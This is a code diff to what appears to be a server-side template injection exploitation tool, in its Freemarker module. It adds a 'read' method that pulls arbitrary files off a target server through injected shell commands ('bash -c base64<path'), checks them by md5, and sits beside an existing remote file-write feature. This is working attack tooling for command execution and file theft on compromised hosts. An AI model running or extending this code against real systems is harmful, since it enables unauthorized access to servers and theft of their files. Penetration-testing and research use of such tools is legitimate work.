@@ -1,7 +1,7 @@
 from core.check import Check
 from utils.loggers import log
 from utils import rand
-from utils.strings import quote, chunkit, base64encode, md5
+from utils.strings import quote, chunkit, base64encode, base64decode, md5
 import re
 
 class Freemarker(Check):
@@ -42,13 +42,6 @@ class Freemarker(Check):
     def detect_write(self):
         self.set('write', self.get('exec'))
     
-    def _md5(self, remote_path):
-        
-        md5_result = self.execute("bash -c md5<%s" % (remote_path))
-        md5_extracted = re.findall(r"([a-fA-F\d]{32})", md5_result)
-        if md5_extracted:
-            return md5_extracted[0]
-    
     def write(self, data, remote_path):
         
         # Check existance and overwrite with --force-overwrite
@@ -69,3 +62,34 @@ class Freemarker(Check):
             log.warn('Remote file md5 mismatch, check manually')
         else:
             log.warn('File uploaded correctly')
+
+    def _md5(self, remote_path):
+        
+        md5_result = self.execute("bash -c md5<%s" % (remote_path))
+        md5_extracted = re.findall(r"([a-fA-F\d]{32})", md5_result)
+        if md5_extracted:
+            return md5_extracted[0]
+            
+    def detect_read(self):
+        self.set('read', self.get('exec'))
+    
+    def read(self, remote_path):
+        
+        # Get remote file md5
+        md5_remote = self._md5(remote_path)
+            
+        if not md5_remote:
+            log.warn('Error getting remote file md5, check presence and permission')
+            return
+        
+        # Using base64 since self.execute() calling self.inject() strips
+        # the response, corrupting the data
+        data_b64encoded = self.execute('bash -c base64<%s' % remote_path)
+        data = base64decode(data_b64encoded)
+        
+        if not md5(data) == md5_remote:
+            log.warn('Remote file md5 mismatch, check manually')
+        else:
+            log.warn('File downloaded correctly')
+            
+        return data
